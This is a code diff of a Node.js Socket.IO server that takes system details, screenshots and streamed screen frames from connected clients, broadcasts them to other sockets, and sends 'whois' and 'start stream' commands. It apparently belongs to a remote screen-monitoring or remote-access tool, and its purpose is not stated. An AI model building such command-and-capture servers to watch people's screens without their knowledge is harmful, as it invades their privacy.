@@ -14,35 +14,37 @@ app.get('/', (req, res) => {
 
 // --------------- SOCKIO CONNECTION ---------------
 io.on('connection', (socket) => {
-    let systemInformation = null
-    console.log(socket)
+    let addedClient = false
     console.log("---------------- New connection ----------------")
 
-    socket.on("system", (options) => {
-        systemInformation = options
-        console.log(systemInformation)
+    socket.on("add client", (options) => {
+        if (addedClient) return
 
-        // TESTING
-        socket.emit("command", { event: "start_stream" })
+        socket.clientData = options
+        addedClient = true
+        console.log(socket.clientData)
     })
 
     socket.on("error", (options) => {
         console.log("Error: ", options)
-        socket.to("/panel").emit("error", options)
+        socket.broadcast.emit("error", options)
+    })
+
+    socket.on("info", (options) => {
+        console.log("Info: ", options)
+        socket.broadcast.emit("info", options)
     })
 
     socket.on("screenshot", (imageBuffer) => {
-        // SEND TO PANEL USERS
-        socket.to("/panel").emit('screenshot', imageBuffer.toString("base64"));
+        socket.broadcast.emit('screenshot', imageBuffer.toString("base64"));
     })
 
     socket.on("frame", (imageBuffer) => {
-        // SEND TO PANEL USERS
-        socket.to("/panel/stream").emit('frame', imageBuffer.toString("base64"));
+        socket.broadcast.emit('frame', imageBuffer.toString("base64"));
     })
 
-    // START COMMAND
-    socket.emit("command", { event: "whois" })
+    // TESTING
+    socket.emit("command", { event: "start stream" })
 });
 
 // --------------- START SERVER ---------------
